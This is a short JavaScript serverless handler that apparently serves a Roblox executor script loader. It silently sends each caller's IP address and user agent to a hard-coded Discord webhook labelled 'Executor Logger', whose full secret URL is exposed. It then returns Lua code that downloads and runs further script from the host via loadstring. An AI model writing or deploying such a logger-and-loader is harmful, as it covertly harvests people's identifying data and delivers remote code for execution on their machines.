export default async function handler(req, res) {
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const ua = req.headers["user-agent"] || "Unknown";

  const webhook = "https://discord.com/api/webhooks/1448659618837561525/vum0kjDEX0GDZyPslwgu5wAJTxJcajgUMu-CTVaU-T4NLKWP12i53c4wj8goBXoGbRii";

  const data = {
    username: "Executor Logger",
    content: `실행됨!\nIP: \`${ip}\`\nUA: \`${ua}\``
  };

  await fetch(webhook, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data)
  });

  res.status(200).json({
    script: `
      local HttpService = game:GetService("HttpService")
      loadstring(HttpService:GetAsync("${req.headers.host}/api/raw"))()
    `
  });
}
